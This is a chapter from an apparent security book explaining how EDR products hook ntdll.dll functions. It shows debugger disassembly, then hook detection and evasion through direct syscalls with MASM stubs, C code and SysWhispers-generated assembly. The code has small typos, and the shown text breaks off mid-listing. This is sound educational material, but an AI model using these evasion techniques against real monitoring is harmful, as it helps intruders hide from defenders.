<html><head></head><body>
<section epub:type="chapter" role="doc-chapter" aria-labelledby="ch2">&#13;
<header>&#13;
<h1 class="CHAPTER" id="ch2">&#13;
<span class="CN"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_17" aria-label=" Page 17. "/><samp class="SANS_Futura_Std_Bold_Condensed_B_11">2</samp></span>&#13;
<span class="CT"><samp class="SANS_Dogma_OT_Bold_B_11">FUNCTION-HOOKING DLLS</samp></span>&#13;
</h1>&#13;
</header>&#13;
<figure class="opener"><img class="opener" src="../images/opener-img.png" alt=""/>&#13;
</figure>&#13;
<p class="CO">Of all the components included in modern endpoint security products, the most widely deployed are DLLs responsible for function <i>hooking</i>, or interception. These DLLs provide defenders with a large amount of important information related to code execution, such as the parameters passed to a function of interest and the values it returns. Today, vendors largely use this data to supplement other, more robust sources of information. Still, function hooking is an important component of EDRs. In this chapter, we’ll discuss how EDRs most commonly intercept function calls and what we, as attackers, can do to interfere with them.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_18" aria-label=" Page 18. "/>This chapter focuses heavily on the hooking of functions in a Windows file called <i>ntdll.dll</i>, whose functionality we’ll cover shortly, but modern EDRs hook other Windows functions too. The process of implementing these other hooks closely resembles the workflow described in this chapter.</p>&#13;
<section epub:type="division" aria-labelledby="sec1">&#13;
<h2 class="H1" id="sec1"><span id="h-22"/><samp class="SANS_Futura_Std_Bold_B_11">How Function Hooking Works</samp></h2>&#13;
<p class="TNI">To understand how endpoint security products use code hooking, you must understand how code running in user mode interacts with the kernel. This code typically leverages the Win32 API during execution to perform certain functions on the host, such as requesting a handle to another process. However, in many cases, the functionality provided via Win32 can’t be completed entirely in user mode. Some actions, such as memory and object management, are the responsibility of the kernel.</p>&#13;
<p class="TX">To transfer execution to the kernel, x64 systems use a syscall instruction. But rather than implementing syscall instructions in every function that needs to interact with the kernel, Windows provides them via functions in <i>ntdll.dll</i>. A function simply needs to pass the required parameters to this exported function; the function will, in turn, pass control into the kernel and then return the results of the operation. For example, <a href="#fig2-1">Figure 2-1</a> demonstrates the execution flow that occurs when a user-mode application calls the Win32 API function <samp class="SANS_TheSansMonoCd_W5Regular_11">kernel32!OpenProcess()</samp>.</p>&#13;
<figure class="IMG"><img id="fig2-1" class="img100" src="../images/Figure2-1.png" alt=""/>&#13;
<figcaption><p class="CAP"><samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 2-1: The flow of execution from user mode to kernel mode</samp></p></figcaption>&#13;
</figure>&#13;
<p class="TX">To detect malicious activity, vendors often hook these Windows APIs. For example, one way that EDRs detect remote process injection is to hook the functions responsible for opening a handle to another process, allocating a region of memory, writing to the allocated memory, and creating the remote thread.</p>&#13;
<p class="TX">In earlier versions of Windows, vendors (and malware authors) often placed their hooks on the System Service Dispatch Table (SSDT), a table in the kernel that holds the pointers to the kernel functions used upon invocation of a syscall. Security products would overwrite these function pointers with pointers to functions in their own kernel module used to log information about the function call and then execute the target function. They would then pass the return values back to the source application.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_19" aria-label=" Page 19. "/>With the introduction of Windows XP in 2005, Microsoft made the decision to prevent the patching of SSDT, among a host of other critical structures, using a protection called Kernel Patch Protection (KPP), also known as PatchGuard, so this technique is not viable on modern 64-bit Windows versions. This means that traditional hooking must be done in user mode. Because the functions performing the syscalls in <i>ntdll.dll</i> are the last possible place to observe API calls in user mode, EDRs will often hook these functions in order to inspect their invocation and execution. Some commonly hooked functions are detailed in <a href="#tab2-1">Table 2-1</a>.</p>&#13;
<figure class="table">&#13;
<table class="table">&#13;
<caption>&#13;
<p class="TT" id="tab2-1"><samp class="SANS_Futura_Std_Heavy_B_11">Table 2-1:</samp> <samp class="SANS_Futura_Std_Book_11">Commonly Hooked Functions in</samp> <samp class="SANS_Futura_Std_Book_Oblique_I_11">ntdll.dll</samp></p>&#13;
</caption>&#13;
<thead>&#13;
<tr class="table">&#13;
<th class="table TCH" scope="col">&#13;
<p class="TCH"><samp class="SANS_Futura_Std_Heavy_B_11">Function names</samp></p>&#13;
</th>&#13;
<th class="table TCH" scope="col">&#13;
<p class="TCH"><samp class="SANS_Futura_Std_Heavy_B_11">Related attacker techniques</samp></p>&#13;
</th>&#13;
</tr>&#13;
</thead>&#13;
<tbody>&#13;
<tr class="table">&#13;
<td class="table TBF">&#13;
<p class="TB"><samp class="SANS_TheSansMonoCd_W5Regular_11">NtOpenProcess<span class="block"/>NtAllocateVirtualMemory</samp><span class="block"/><samp class="SANS_TheSansMonoCd_W5Regular_11">NtWriteVirtualMemory</samp><span class="block"/><samp class="SANS_TheSansMonoCd_W5Regular_11">NtCreateThreadEx</samp></p>&#13;
</td>&#13;
<td class="table TBF">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_11">Remote process injection</samp></p>&#13;
</td>&#13;
</tr>&#13;
<tr class="table">&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_TheSansMonoCd_W5Regular_11">NtSuspendThread<span class="block"/>NtResumeThread</samp><span class="block"/><samp class="SANS_TheSansMonoCd_W5Regular_11">NtQueueApcThread</samp></p>&#13;
</td>&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_11">Shellcode injection via asynchronous procedure call (APC)</samp></p>&#13;
</td>&#13;
</tr>&#13;
<tr class="table">&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_TheSansMonoCd_W5Regular_11">NtCreateSection<span class="block"/>NtMapViewOfSection</samp> <samp class="SANS_TheSansMonoCd_W5Regular_11">NtUnmapViewOfSection</samp></p>&#13;
</td>&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_11">Shellcode injection via mapped memory sections</samp></p>&#13;
</td>&#13;
</tr>&#13;
<tr class="table">&#13;
<td class="table TBL">&#13;
<p class="TB"><samp class="SANS_TheSansMonoCd_W5Regular_11">NtLoadDriver</samp></p>&#13;
</td>&#13;
<td class="table TBL">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_11">Driver loading using a configuration stored in the registry</samp></p>&#13;
</td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
</figure>&#13;
<p class="TX">By intercepting calls to these APIs, an EDR can observe the parameters passed to the original function, as well as the value returned to the code that called the API. Agents can then examine this data to determine whether the activity was malicious. For example, to detect remote process injection, an agent could monitor whether the region of memory was allocated with read-write-execute permissions, whether data was written to the new allocation, and whether a thread was created using a pointer to the written data.</p>&#13;
<section epub:type="division" aria-labelledby="sec2">&#13;
<h3 class="H2" id="sec2"><span id="h-23"/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Implementing the Hooks with Microsoft Detours</samp></h3>&#13;
<p class="TNI">While a large number of libraries make it easy to implement function hooks, most leverage the same technique under the hood. This is because, at its core, all function hooking involves patching unconditional jump (<samp class="SANS_TheSansMonoCd_W5Regular_11">JMP</samp>) instructions to redirect the flow of execution from the function being hooked into the function specified by the developer of the EDR.</p>&#13;
<p class="TX">Microsoft Detours is one of the most commonly used libraries for implementing function hooks. Behind the scenes, Detours replaces the first few instructions in the function to be hooked with an unconditional <samp class="SANS_TheSansMonoCd_W5Regular_11">JMP</samp> instruction that will redirect execution to a developer-defined function, also referred to as a <i>detour</i>. This detour function performs actions specified by the developer, such as logging the parameters passed to the target function. Then it passes execution to another function, often called a <i>trampoline</i>, which executes the target function and contains the instructions that were <span role="doc-pagebreak" epub:type="pagebreak" id="pg_20" aria-label=" Page 20. "/>originally overwritten. When the target function completes its execution, control is returned to the detour. The detour may perform additional processing, such as logging the return value or output of the original function, before returning control to the original process.</p>&#13;
<p class="TX"><a href="#fig2-2">Figure 2-2</a> illustrates a normal process’s execution compared to one with a detour. The solid arrow indicates expected execution flow, and the dashed arrow indicates hooked execution.</p>&#13;
<figure class="IMG"><img id="fig2-2" class="img100" src="../images/Figure2-2.png" alt=""/>&#13;
<figcaption><p class="CAP"><samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 2-2: Normal and hooked execution paths</samp></p></figcaption>&#13;
</figure>&#13;
<p class="TX">In this example, the EDR has opted to hook <samp class="SANS_TheSansMonoCd_W5Regular_11">ntdll!NtCreateFile()</samp>, the syscall used to either create a new I/O device or open a handle to an existing one. Under normal operation, this syscall would transition immediately to the kernel, where its kernel-mode counterpart would continue operations. With the EDR’s hook in place, execution now makes a stop in the injected DLL. This <samp class="SANS_TheSansMonoCd_W5Regular_11">edr!HookedNtCreateFile()</samp> function will make the syscall on behalf of <samp class="SANS_TheSansMonoCd_W5Regular_11">ntdll!NtCreateFile()</samp>, allowing it to collect information about the parameters passed to the syscall, as well as the result of the operation.</p>&#13;
<p class="TX">Examining a hooked function in a debugger, such as WinDbg, clearly shows the differences between a function that has been hooked and one that hasn’t. <a href="#list2-1">Listing 2-1</a> shows what an unhooked <samp class="SANS_TheSansMonoCd_W5Regular_11">kernel32!Sleep()</samp> function looks like in WinDbg.</p>&#13;
<pre id="list2-1"><code>1:004&gt; <b>uf KERNEL32!SleepStub</b>&#13;
KERNEL32!SleepStub:&#13;
00007ffa`9d6fada0 48ff25695c0600  jmp    qword ptr [KERNEL32!imp_Sleep (00007ffa`9d760a10)&#13;
&#13;
KERNEL32!_imp_Sleep:&#13;
00007ffa`9d760a10 d08fcc9cfa7f    ror    byte ptr [rdi+7FFA9CCCh],1&#13;
00007ffa`9d760a16 0000            add byte ptr [rax],al&#13;
00007ffa`9d760a18 90              nop&#13;
00007ffa`9d760a19 f4              hlt&#13;
00007ffa`9d760a1a cf              iretd</code></pre>&#13;
<p class="CodeListingCaptionWide"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 2-1: The unhooked <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">kernel32!SleepStub()</samp> function in WinDbg</span></p>&#13;
<p class="TX">This disassembly of the function shows the execution flow that we expect. When the caller invokes <samp class="SANS_TheSansMonoCd_W5Regular_11">kernel32!Sleep()</samp>, the jump stub <samp class="SANS_TheSansMonoCd_W5Regular_11">kernel32!SleepStub()</samp> is executed, long-jumping (<samp class="SANS_TheSansMonoCd_W5Regular_11">JMP</samp>) to <samp class="SANS_TheSansMonoCd_W5Regular_11">kernel32!_imp_Sleep()</samp>, which provides the real <samp class="SANS_TheSansMonoCd_W5Regular_11">Sleep()</samp> functionality the caller expects.</p>&#13;
<p class="TX">The function looks substantially different after the injection of a DLL that leverages Detours to hook it, shown in <a href="#list2-2">Listing 2-2</a>.</p>&#13;
<pre id="list2-2"><code><span role="doc-pagebreak" epub:type="pagebreak" id="pg_21" aria-label=" Page 21. "/>1:005&gt; <b>uf KERNEL32!SleepStub</b>&#13;
KERNEL32!SleepStub:&#13;
00007ffa`9d6fada0 e9d353febf jmp   00007ffa`5d6e0178&#13;
00007ffa`9d6fada5 cc         int   3&#13;
00007ffa`9d6fada6 cc         int   3&#13;
00007ffa`9d6fada7 cc         int   3&#13;
00007ffa`9d6fada8 cc         int   3&#13;
00007ffa`9d6fada9 cc         int   3&#13;
00007ffa`9d6fadaa cc         int   3&#13;
00007ffa`9d6fadab cc         int   3&#13;
&#13;
1:005&gt; u 00007ffa`5d6e0178&#13;
00007ffa`5d6e0178 ff25f2ffffff  jmp  qword ptr [00007ffa`5d6e0170]&#13;
00007ffa`5d6e017e cc            int  3&#13;
00007ffa`5d6e017f cc            int  3&#13;
00007ffa`5d6e0180 0000N         add  byte ptr [rax],al&#13;
00007ffa`5d6e0182 0000          add  byte ptr [rax],al&#13;
00007ffa`5d6e0184 0000          add  byte ptr [rax],al&#13;
00007ffa`5d6e0186 0000          add  byte ptr [rax],al&#13;
00007ffa`5d6e0188 0000          add  byte ptr [rax],al</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 2-2: The hooked <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">kernel32!Sleep()</samp> function in WinDbg</span></p>&#13;
<p class="TX">Instead of a <samp class="SANS_TheSansMonoCd_W5Regular_11">JMP</samp> to <samp class="SANS_TheSansMonoCd_W5Regular_11">kernel32!_imp_Sleep()</samp>, the disassembly contains a series of <samp class="SANS_TheSansMonoCd_W5Regular_11">JMP</samp> instructions, the second of which lands execution in <samp class="SANS_TheSansMonoCd_W5Regular_11">trampoline64!TimedSleep()</samp>, shown in <a href="#list2-3">Listing 2-3</a>.</p>&#13;
<pre id="list2-3"><code>0:005&gt; <b>uf poi(00007ffa`5d6e0170)</b>&#13;
trampoline64!TimedSleep&#13;
 10 00007ffa`82881010 48895c2408     mov     qword ptr [rsp+8],rbx&#13;
 10 00007ffa`82881015 57             push    rdi&#13;
 10 00007ffa`82881016 4883ec20       sub     rsp,20h&#13;
 10 00007ffa`8288101a 8bf9           mov     edi,ecx&#13;
 10 00007ffa`8288101c 4c8d05b5840000 lea     r8,[trampoline64!'string' (00007ffa`828894d8)]&#13;
 10 00007ffa`82881023 33c9           xor     ecx,ecx&#13;
 10 00007ffa`82881025 488d15bc840000 lea     rdx,[trampoline64!'string' (00007ffa`828894d8)]&#13;
 10 00007ffa`8288102c 41b930000000   mov     r9d,30h&#13;
 10 00007ffa`82881032 ff15f8800000   call    qword ptr [trampoline64!_imp_MessageBoxW]&#13;
 10 00007ffa`82881038 ff15ca7f0000   call    qword ptr [trampoline64!_imp_GetTickCount]&#13;
 10 00007ffa`8288103e 8bcf           mov     ecx,edi&#13;
 10 00007ffa`8288103e 8bd8           mov     ebx,eax&#13;
 10 00007ffa`82881040 ff15f0a60000   call    qword ptr [trampoline64!TrueSleep]&#13;
 10 00007ffa`82881042 ff15ba7f0000   call    qword ptr [trampoline64!_imp_GetTickCount]&#13;
 10 00007ffa`82881048 2bc3           sub     eax,ebx&#13;
 10 00007ffa`8288104e f00fc105e8a60000  lock xadd dword ptr [trampoline64!dwSlept],eax&#13;
 10 00007ffa`82881050 488b5c2430     mov     rbx,qword ptr [rsp+30h]&#13;
 10 00007ffa`82881058 4883c420       add     rsp,20h&#13;
 10 00007ffa`8288105d 5f             pop     rdi&#13;
 10 00007ffa`82881061 c3             ret</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 2-3: The <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">kernel32!Sleep()</samp> intercept function</span></p>&#13;
<p class="TX">To collect metrics about the hooked function’s execution, this trampoline function evaluates the amount of time it sleeps, in CPU <span role="doc-pagebreak" epub:type="pagebreak" id="pg_22" aria-label=" Page 22. "/>ticks, by calling the legitimate <samp class="SANS_TheSansMonoCd_W5Regular_11">kernel32!Sleep()</samp> function via its internal <samp class="SANS_TheSansMonoCd_W5Regular_11">trampoline64!TrueSleep()</samp> wrapper function. It displays the tick count in a pop-up message.</p>&#13;
<p class="TX">While this is a contrived example, it demonstrates the core of what every EDR’s function-hooking DLL does: proxying the execution of the target function and collecting information about how it was invoked. In this case, our EDR simply measures how long the hooked program sleeps. In a real EDR, functions important to adversary behavior, such as <samp class="SANS_TheSansMonoCd_W5Regular_11">ntdll!NtWriteVirtualMemory()</samp> for copying code into a remote process, would be proxied in the same way, but the hooking might pay more attention to the parameters being passed and the values returned.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec3">&#13;
<h3 class="H2" id="sec3"><span id="h-24"/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Injecting the DLL</samp></h3>&#13;
<p class="TNI">A DLL that hooks functions isn’t particularly useful until it is loaded into the target process. Some libraries offer the ability to spawn a process and inject the DLL through an API, but this isn’t practical for EDRs, as they need the ability to inject their DLL into processes spawned by users at any time. Fortunately, Windows provides a few methods to do this.</p>&#13;
<p class="TX">Until Windows 8, many vendors opted to use the <samp class="SANS_TheSansMonoCd_W5Regular_11">AppInit_Dlls</samp> infrastructure to load their DLLs into every interactive process (those that import <i>user32.dll</i>). Unfortunately, malware authors routinely abused this technique for persistence and information collection, and it was notorious for causing system performance issues. Microsoft no longer recommends this method for DLL injection and, starting in Windows 8, prevents it entirely on systems with Secure Boot enabled.</p>&#13;
<p class="TX">The most commonly used technique for injecting a function-hooking DLL into processes is to leverage a driver, which can use a kernel-level feature called <i>kernel asynchronous procedure call (KAPC) injection</i> to insert the DLL into the process. When the driver is notified of the creation of a new process, it will allocate some of the process’s memory for an APC routine and the name of the DLL to inject. It will then initialize a new APC object, which is responsible for loading the DLL into the process, and copy it into the process’s address space. Finally, it will change a flag in the thread’s APC state to force execution of the APC. When the process resumes its execution, the APC routine will run, loading the DLL. <span class="Xref"><a href="chapter5.xhtml">Chapter 5</a></span> explains this process in greater detail.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec4">&#13;
<h2 class="H1" id="sec4"><span id="h-25"/><samp class="SANS_Futura_Std_Bold_B_11">Detecting Function Hooks</samp></h2>&#13;
<p class="TNI">Offensive security practitioners often want to identify whether the functions they plan to use are hooked. Once they identify hooked functions, they can make a list of them and then limit, or entirely avoid, their use. This allows the adversary to bypass inspection by the EDR’s function-hooking DLL, as its inspection function will never be invoked. The process of detecting hooked functions is incredibly simple, especially for the native API functions exported by <i>ntdll.dll</i>.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_23" aria-label=" Page 23. "/>Each function inside <i>ntdll.dll</i> consists of a syscall stub. The instructions that make up this stub are shown in <a href="#list2-4">Listing 2-4</a>.</p>&#13;
<pre id="list2-4"><code>mov r10, rcx&#13;
mov eax, <var>&lt;syscall_number&gt;</var>&#13;
syscall&#13;
retn</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 2-4: Syscall stub assembly instructions</span></p>&#13;
<p class="TX">You can see this stub by disassembling a function exported by <i>ntdll.dll</i> in WinDbg, as shown in <a href="#list2-5">Listing 2-5</a>.</p>&#13;
<pre id="list2-5"><code>0:013&gt; <b>u ntdll!NtAllocateVirtualMemory</b>&#13;
ntdll!NtAllocateVirtualMemory&#13;
00007fff`fe90c0b0 4c8bd1           mov r10,rcx&#13;
00007fff`fe90c0b5 b818000000       mov eax,18h&#13;
00007fff`fe90c0b8 f694259893fe7f01 test byte ptr [SharedUserData+0x308,1&#13;
00007fff`fe90c0c0 7503             jne ntdll!NtAllocateVirtualMemory+0x15&#13;
00007fff`fe90c0c2 0f05             syscall&#13;
00007fff`fe90c0c4 c3               ret&#13;
00007fff`fe90c0c5 cd2e             int 2Eh&#13;
00007fff`fe90c0c7 c3               ret</code></pre>&#13;
<p class="CodeListingCaptionWide"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 2-5: The unmodified syscall stub for <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">ntdll!NtAllocateVirtualMemory()</samp></span></p>&#13;
<p class="TX">In the disassembly of <samp class="SANS_TheSansMonoCd_W5Regular_11">ntdll!NtAllocateVirtualMemory()</samp>, we see the basic building blocks of the syscall stub. The stub preserves the volatile RCX register in the R10 register and then moves the syscall number that correlates to <samp class="SANS_TheSansMonoCd_W5Regular_11">NtAllocateVirtualMemory()</samp>, or 0x18 in this version of Windows, into EAX. Next, the <samp class="SANS_TheSansMonoCd_W5Regular_11">TEST</samp> and conditional jump (<samp class="SANS_TheSansMonoCd_W5Regular_11">JNE</samp>) instructions following <samp class="SANS_TheSansMonoCd_W5Regular_11">MOV</samp> are a check found in all syscall stubs. Restricted User Mode uses it when Hypervisor Code Integrity is enabled for kernel-mode code but not user-mode code. You can safely ignore it in this context. Finally, the syscall instruction is executed, transitioning control to the kernel to handle the memory allocation. When the function completes and control is given back to <samp class="SANS_TheSansMonoCd_W5Regular_11">ntdll!NtAllocateVirtualMemory()</samp>, it simply returns.</p>&#13;
<p class="TX">Because the syscall stub is the same for all native APIs, any modification of it indicates the presence of a function hook. For example, <a href="#list2-6">Listing 2-6</a> shows the tampered syscall stub for the <samp class="SANS_TheSansMonoCd_W5Regular_11">ntdll!NtAllocateVirtualMemory()</samp> function.</p>&#13;
<pre id="list2-6"><code>0:013&gt; <b>u ntdll!NtAllocateVirtualMemory</b>&#13;
ntdll!NtAllocateVirtualMemory&#13;
00007fff`fe90c0b0 e95340baff       jmp 00007fff`fe4b0108&#13;
00007fff`fe90c0b5 90               nop&#13;
00007fff`fe90c0b6 90               nop&#13;
00007fff`fe90c0b7 90               nop&#13;
00007fff`fe90c0b8 f694259893fe7f01 test byte ptr [SharedUserData+0x308],1&#13;
00007fff`fe90c0c0 7503             jne ntdll!NtAllocateVirtualMemory+0x15&#13;
00007fff`fe90c0c2 0f05             syscall<span role="doc-pagebreak" epub:type="pagebreak" id="pg_24" aria-label=" Page 24. "/>&#13;
00007fff`fe90c0c4 c3               ret&#13;
00007fff`fe90c0c5 cd2e             int 2Eh&#13;
00007fff`fe90c0c7 c3               ret</code></pre>&#13;
<p class="CodeListingCaptionWide"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 2-6: The hooked <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">ntdll!NtAllocateVirtualMemory()</samp> function</span></p>&#13;
<p class="TX">Notice here that, rather than the syscall stub existing at the entry point of <samp class="SANS_TheSansMonoCd_W5Regular_11">ntdll!NtAllocateVirtualMemory()</samp>, an unconditional <samp class="SANS_TheSansMonoCd_W5Regular_11">JMP</samp> instruction is present. EDRs commonly use this type of modification to redirect execution flow to their hooking DLL.</p>&#13;
<p class="TX">Thus, to detect hooks placed by an EDR, we can simply examine functions in the copy of <i>ntdll.dll</i> currently loaded into our process, comparing their entry-point instructions with the expected opcodes of an unmodified syscall stub. If we find a hook on a function we want to use, we can attempt to evade it using the techniques described in the next section.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec5">&#13;
<h2 class="H1" id="sec5"><span id="h-26"/><samp class="SANS_Futura_Std_Bold_B_11">Evading Function Hooks</samp></h2>&#13;
<p class="TNI">Of all the sensor components used in endpoint security software, function hooks are one of the most well researched when it comes to evasion. Attackers can use a myriad of methods to evade function interception, all of which generally boil down to one of the following techniques:</p>&#13;
<ul class="BL">&#13;
<li class="BL">Making direct syscalls to execute the instructions of an unmodified syscall stub</li>&#13;
<li class="BL">Remapping <i>ntdll.dll</i> to get unhooked function pointers or overwriting the hooked <i>ntdll.dll</i> currently mapped in the process</li>&#13;
<li class="BL">Blocking non-Microsoft DLLs from loading in the process to prevent the EDR’s function-hooking DLL from placing its detours</li>&#13;
</ul>&#13;
<p class="TX">This is by no means an exhaustive list. One example of a technique that doesn’t fit into any of these categories is vectored exception handling, as detailed in Peter Winter-Smith’s blog post “FireWalker: A New Approach to Generically Bypass User-Space EDR Hooking.” Winter-Smith’s technique uses a <i>vectored exception handler (VEH)</i>, an extension to structured exception handling that allows the developer to register their own function for which to watch and handle all exceptions in a given application. It sets the processor’s trap flag to put the program into single-step mode. On each new instruction, the evasion code generates a single-step exception on which the VEH has first right of refusal. The VEH will step over the hook placed by the EDR by updating the instruction pointer to the chunk containing the original, unmodified code.</p>&#13;
<p class="TX">While interesting, this technique currently only works for 32-bit applications and can adversely affect a program’s performance, due to the single stepping. For these reasons, this approach to evasion remains beyond the scope of this chapter. We’ll instead focus on more broadly applicable techniques.</p>&#13;
<section epub:type="division" aria-labelledby="sec6">&#13;
<h3 class="H2" id="sec6"><span id="h-27"/><span role="doc-pagebreak" epub:type="pagebreak" id="pg_25" aria-label=" Page 25. "/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Making Direct Syscalls</samp></h3>&#13;
<p class="TNI">By far, the most commonly abused technique for evading hooks placed on <i>ntdll.dll</i> functions is making direct syscalls. If we execute the instructions of a syscall stub ourselves, we can mimic an unmodified function. To do so, our code must include the desired function’s signature, a stub containing the correct syscall number, and an invocation of the target function. This invocation uses the signature and stub to pass in the required parameters and execute the target function in a way that the function hooks won’t detect. <a href="#list2-7">Listing 2-7</a> contains the first file we need to create to execute this technique.</p>&#13;
<pre id="list2-7"><code>NtAllocateVirtualMemory PROC&#13;
    mov r10, rcx&#13;
    mov eax, 0018h&#13;
    syscall&#13;
    ret&#13;
NtAllocateVirtualMemory ENDP</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 2-7: Assembly instructions for <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">NtAllocateVirtualMemory()</samp></span></p>&#13;
<p class="TX">The first file in our project contains what amounts to a reimplementation of <samp class="SANS_TheSansMonoCd_W5Regular_11">ntdll!NtAllocateVirtualMemory()</samp>. The instructions contained inside the sole function will fill the EAX register with the syscall number. Then, a syscall instruction is executed. This assembly code would reside in its own <i>.asm</i> file, and Visual Studio can be configured to compile it using the Microsoft Macro Assembler (MASM), with the rest of the project.</p>&#13;
<p class="TX">Even though we have our syscall stub built out, we still need a way to call it from our code. <a href="#list2-8">Listing 2-8</a> shows how we would do that.</p>&#13;
<pre id="list2-8"><code>EXTERN_C NTSTATUS NtAllocateVirtualMemory(&#13;
    HANDLE ProcessHandle,&#13;
    PVOID BaseAddress,&#13;
    ULONG ZeroBits,&#13;
    PULONG RegionSize,&#13;
    ULONG AllocationType,&#13;
    ULONG Protect);</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 2-8: The definition of <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">NtAllocateVirtualMemory()</samp> to be included in the project header file</span></p>&#13;
<p class="TX">This function definition contains all the required parameters and their types, along with the return type. It should live in our header file, <i>syscall.h</i>, and will be included in our C source file, shown in <a href="#list2-9">Listing 2-9</a>.</p>&#13;
<pre id="list2-9"><code>#include "syscall.h"&#13;
&#13;
void wmain()dg&#13;
{&#13;
    LPVOID lpAllocationStart = NULL;&#13;
  <span class="CodeAnnotationCode" aria-label="annotation1">❶</span> NtAllocateVirtualMemory(GetCurrentProcess(),&#13;
        &amp;lpAllocationStart,<span role="doc-pagebreak" epub:type="pagebreak" id="pg_26" aria-label=" Page 26. "/>&#13;
        0,&#13;
        (PULONG)0x1000,&#13;
        MEM_COMMIT | MEM_RESERVE,&#13;
        PAGE_READWRITE);&#13;
}</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 2-9: Making a direct syscall in C</span></p>&#13;
<p class="TX">The <samp class="SANS_TheSansMonoCd_W5Regular_11">wmain()</samp> function in this file calls <samp class="SANS_TheSansMonoCd_W5Regular_11">NtAllocateVirtualMemory()</samp> <span class="CodeAnnotation" aria-label="annotation1">❶</span> to allocate a 0x1000-byte buffer in the current process with read-write permissions. This function is not defined in the header files that Microsoft makes available to developers, so we have to define it in our own header file. When this function is invoked, rather than calling into <i>ntdll.dll</i>, the assembly code we included in the project will be called, effectively simulating the behavior of an unhooked <samp class="SANS_TheSansMonoCd_W5Regular_11">ntdll!NtAllocateVirtualMemory()</samp> without running the risk of hitting an EDR’s hook.</p>&#13;
<p class="TX">One of the primary challenges of this technique is that Microsoft frequently changes syscall numbers, so any tooling that hardcodes these numbers may only work on specific Windows builds. For example, the syscall number for <samp class="SANS_TheSansMonoCd_W5Regular_11">ntdll!NtCreateThreadEx()</samp> on build 1909 of Windows 10 is 0xBD. On build 20H1, the following release, it is 0xC1. This means that a tool targeting build 1909 won’t work on later versions of Windows.</p>&#13;
<p class="TX">To help address this limitation, many developers rely on external sources to track these changes. For example, Mateusz Jurczyk of Google’s Project Zero maintains a list of functions and their associated syscall numbers for each release of Windows. In December 2019, Jackson Thuraisamy published the tool SysWhispers, which gave attackers the ability to dynamically generate the function signatures and assembly code for the syscalls in their offensive tooling. <a href="#list2-10">Listing 2-10</a> shows the assembly code generated by SysWhispers when targeting the <samp class="SANS_TheSansMonoCd_W5Regular_11">ntdll!NtCreateThreadEx()</samp> function on builds 1903 through 20H2 of Windows 10.</p>&#13;
<pre id="list2-10"><code>NtCreateThreadEx PROC&#13;
    mov rax, gs:[60h] ; Load PEB into RAX.&#13;
NtCreateThreadEx_Check_X_X_XXXX: ; Check major version.&#13;
    cmp dword ptr [rax+118h], 10&#13;
    je  NtCreateThreadEx_Check_10_0_XXXX&#13;
    jmp NtCreateThreadEx_SystemCall_Unknown&#13;
<span class="CodeAnnotationHang" aria-label="annotation1">❶</span> NtCreateThreadEx_Check_10_0_XXXX: ;&#13;
    cmp word ptr [rax+120h], 18362&#13;
    je  NtCreateThreadEx_SystemCall_10_0_18362&#13;
    cmp word ptr [rax+120h], 18363&#13;
    je  NtCreateThreadEx_SystemCall_10_0_18363&#13;
    cmp word ptr [rax+120h], 19041&#13;
    je NtCreateThreadEx_SystemCall_10_0_19041&#13;
    cmp word ptr [rax+120h], 19042&#13;
    je NtCreateThreadEx_SystemCall_10_0_19042&#13;
    jmp NtCreateThreadEx_SystemCall_Unknown&#13;
NtCreateThreadEx_SystemCall_10_0_18362: ; Windows 10.0.18362 (1903)&#13;
  <span class="CodeAnnotationCode-1" aria-label="annotation2">❷</span> mov  eax, 00bdh&#13;
    jmp NtCreateThreadEx_Epilogue<span role="doc-pagebreak" epub:type="pagebreak" id="pg_27" aria-label=" Page 27. "/>&#13;
NtCreateThreadEx_SystemCall_10_0_18363: ; Windows 10.0.18363 (1909)&#13;
    mov eax, 00bdh&#13;
    jmp NtCreateThreadEx_Epilogue&#13;
NtCreateThreadEx_SystemCall_10_0_19041: ; Windows 10.0.19041 (2004)&#13;
    mov eax, 00c1h&#13;
    jmp NtCreateThreadEx_Epilogue&#13;
NtCreateThreadEx_SystemCall_10_0_19042: ; Windows 10.0.19042 (20H2)&#13;
    mov eax, 00c1h&#13;
    jmp NtCreateThreadEx_Epilogue&#13;
